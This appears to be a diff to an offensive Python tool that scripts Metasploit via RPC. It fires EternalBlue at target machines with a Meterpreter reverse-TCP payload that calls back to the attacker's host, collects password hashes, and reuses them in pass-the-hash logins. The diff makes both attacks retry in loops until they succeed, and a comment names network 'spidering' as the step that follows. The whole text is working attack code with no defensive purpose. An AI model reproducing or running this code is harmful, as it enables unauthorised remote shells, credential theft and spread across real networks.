@@ -102,21 +102,15 @@ def passTheHash(ip, localip, hashlist, client):
             continue
         exploit['SMBUser'] = data[0]
         exploit['SMBPass'] = data[2]
-        print('Trying ' + data[0] + " on " + ip + '...')
-        hashes = runExploit(client, exploit, payload, 5)
-        if hashes != None:
-            print('Successfully accessed ' + ip)
-            return hashes
-        print('Trying again...')
-        hashes = runExploit(client, exploit, payload, 5)
-        if hashes != None:
-            print('Successfully accessed ' + ip)
-            return hashes
-        print('Trying one more time...')
-        hashes = runExploit(client, exploit, payload, 5)
-        if hashes != None:
-            print('Successfully accessed ' + ip)
-            return hashes
+        times = 1
+        while times <= 10:
+           print('Trying ' + data[0] + ' on ' + ip + '...')
+           hashes = runExploit(client, exploit, payload, 6)
+           if hashes != None:
+               print('Successfeully accessed ' + ip + ' in ' + str(times) + ' attempts')
+               return hashes
+           else:
+               times += 1
 
     return None
     
@@ -128,10 +122,10 @@ def eternalBlue(ip, localip, client):
     # Load the reverse_tcp shell payload
     payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
     payload['LHOST'] = localip
-    hashes = runExploit(client, exploit, payload, 15)
+    hashes = runExploit(client, exploit, payload, 18)
     if hashes != None:
-        print('Gained ' + str(len(hashes)) + ' hashes from ' + str(ip) + '...')
-        return hashes
+        print('Gained ' + str(len(hashes)) + ' hashes from ' + str(ip))
+        return hashes 
     return None
 
 def maxId(keys):
@@ -193,25 +187,14 @@ def main():
     client = setupRPC()
     # Try to break into machines with eternal blue
     hashes = []
-    for i in reversed(range(len(targets))):
-        hashData = eternalBlue(targets[i].get('ip'), args['localIp'], client)
-        if hashData != None:
-            del targets[i]
-            mergeList(hashes, hashData)
-            break
-        print('Trying again...')
-        hashData = eternalBlue(targets[i].get('ip'), args['localIp'], client)
-        if hashData != None:
-            del targets[i]
-            mergeList(hashes, hashData)
-            break
-        print('Trying one more time...')
-        hashData = eternalBlue(targets[i].get('ip'), args['localIp'], client)
-        if hashData != None:
-            del targets[i]
-            mergeList(hashes, hashData)
-            break
 
+    while len(hashes) == 0:
+        for i in reversed(range(len(targets))):
+            hashData = eternalBlue(targets[i].get('ip'), args['localIp'], client)
+            if hashData != None:
+                del targets[i]
+                mergeList(hashes, hashData)
+                break
 
     if len(hashes) > 0:
         # Found access to network start spidering
